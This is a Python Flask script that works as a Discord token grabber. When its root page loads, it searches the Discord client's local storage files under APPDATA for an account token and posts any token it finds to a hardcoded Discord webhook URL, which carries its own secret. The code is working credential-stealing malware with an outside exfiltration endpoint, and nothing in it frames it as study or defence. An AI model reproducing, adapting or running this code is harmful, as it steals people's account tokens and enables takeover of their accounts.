from flask import Flask

import os
import re
import requests

app = Flask(__name__)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1255196642349416599/XhdAI4R7KifKEie66INdXq-E1L8jtAmO4hnn6Zkxjk5P9dZfJ-cotxTrKbEea8l87jGr'

def send_message(message):
    data = {
        'content': message
    }
    response = requests.post(WEBHOOK_URL, json=data)

    if response.status_code == 204:
        print('Message sent successfully!')
    else:
        print(f'Failed to send message. Status code: {response.status_code}')

def find_and_send_tokens():
    discord_data_path = os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb')
    token_pattern = re.compile(r'"token"\s*:\s*"([^"]+)"')

    for filename in os.listdir(discord_data_path):
        if filename.endswith('.log') or filename.endswith('.ldb'):
            with open(os.path.join(discord_data_path, filename), 'r', errors='ignore') as file:
                content = file.read()
                match = token_pattern.search(content)
                if match:
                    token = match.group(1)
                    print(f'Token found: {token}')
                    send_message(f'Discord token found: {token}')
                    break

@app.route('/')
def index():
    # Run your script function when the page loads
    find_and_send_tokens()
    return 'Script executed successfully!'

if __name__ == '__main__':
    app.run(debug=True)
